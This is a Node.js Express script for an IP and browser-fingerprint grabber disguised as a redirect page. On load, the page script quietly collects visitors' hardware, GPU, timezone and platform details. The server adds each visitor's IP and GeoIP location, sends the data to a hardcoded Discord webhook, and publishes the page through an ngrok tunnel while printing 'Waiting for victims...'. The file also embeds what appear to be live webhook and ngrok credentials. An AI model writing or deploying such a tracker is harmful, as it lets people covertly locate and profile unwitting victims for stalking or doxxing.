const express = require('express');
const axios = require('axios');
const requestIp = require('request-ip');
const maxmind = require('@maxmind/geoip2-node');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
app.set('trust proxy', true);

// ==========================================
// 🔧 CONFIGURATION
// ==========================================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1459597365689323726/rQNK5AWMghoMELAQyZO-SZRm7UxSR5ar1ZceQpCWgzPv-F79jDuAIgkczwT6wkXi_sl_';
const TARGET_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
const DB_FILENAME = 'GeoLite2-City.mmdb';

// Load Database
let dbLookup = null;
const dbPath = path.join(__dirname, DB_FILENAME);
maxmind.Reader.open(dbPath).then(reader => {
    dbLookup = reader;
    console.log("✅ Advanced Database Loaded.");
}).catch(() => console.log("⚠️ Database missing (Location will be generic)."));

// ==========================================
// 🕸️ THE TRAP (Frontend)
// ==========================================
// This route sends the HTML page that runs the extraction code
app.get('/', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Redirecting...</title>
        <style>
            body { background: #121212; color: #ffffff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <script>
            // 1. GATHER ADVANCED FINGERPRINT
            const data = {
                screen: screen.width + "x" + screen.height,
                cores: navigator.hardwareConcurrency || "Unknown",
                memory: navigator.deviceMemory || "Unknown", // RAM in GB
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                gpu: "Unknown",
                referrer: document.referrer || "Direct"
            };

            // Attempt to get GPU Info
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // 2. SEND DATA BACK TO SERVER
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                // 3. REDIRECT USER (After logging is done)
                window.location.href = "${TARGET_URL}"; 
            }).catch(() => {
                window.location.href = "${TARGET_URL}"; // Redirect even if log fails
            });
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// ==========================================
// 📡 THE RECEIVER (Backend)
// ==========================================
// This route listens for the data sent by the browser
app.post('/collect', async (req, res) => {
    const clientIp = requestIp.getClientIp(req);
    const browserData = req.body; // The data from the HTML script

    // Server-Side Location Lookup
    let loc = { city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
    if (dbLookup && clientIp) {
        try {
            const response = dbLookup.city(clientIp);
            if (response) {
                loc.country = response.country?.names?.en;
                loc.city = response.city?.names?.en;
            }
        } catch (e) { }
    }

    // Format the "Advanced" Embed
    const embed = {
        username: "Cyber Sentinel",
        avatar_url: "https://i.imgur.com/4M34hi2.png",
        embeds: [{
            title: `🕵️ Advanced Capture: ${loc.country || 'Unknown'}`,
            color: 0x00FF00, // Matrix Green
            description: `**IP:** \`${clientIp}\``,
            fields: [
                { name: "📍 Geo-Location", value: `${loc.city}, ${loc.country}`, inline: true },
                { name: "⏰ Timezone", value: browserData.timezone, inline: true },
                { name: "🖥️ Screen & Cores", value: `${browserData.screen} px | ${browserData.cores} Cores`, inline: true },
                { name: "💾 RAM", value: `~${browserData.memory} GB`, inline: true },
                { name: "🎮 GPU / Graphics", value: `\`${browserData.gpu}\``, inline: false },
                { name: "💻 Platform", value: browserData.platform, inline: true },
                { name: "🔗 Referrer", value: browserData.referrer, inline: true }
            ],
            footer: { text: "Full Stack Fingerprint System" },
            timestamp: new Date().toISOString()
        }]
    };

    // Send to Discord
    axios.post(DISCORD_WEBHOOK_URL, embed).catch(console.error);

    res.sendStatus(200); // Tell browser "We got it"
});

// ==========================================
// 🏁 START SERVER & TUNNEL
// ==========================================
const ngrok = require('ngrok');

const PORT = 3000;
app.listen(PORT, async () => {
    console.log(`\n🟢 Local Engine Running:  http://localhost:${PORT}`);
    console.log(`⌛ Initializing Ngrok Tunnel...`);

    try {
        await ngrok.authtoken('384jyF85TZS8gMaK9CAPZ2DYIaF_3aUxYUqYGuqoQnoaaqeEV'); // <--- Sets the token globally
        const url = await ngrok.connect({
            proto: 'http',
            addr: PORT,
        });

        console.log(`\n🎉 -----------------------------------------`);
        console.log(`🚀 PUBLIC LINK: ${url}`);
        console.log(`🎉 -----------------------------------------\n`);
        console.log(`Waiting for victims...`);

    } catch (error) {
        console.error("❌ Ngrok Error:", error.message);
    }
});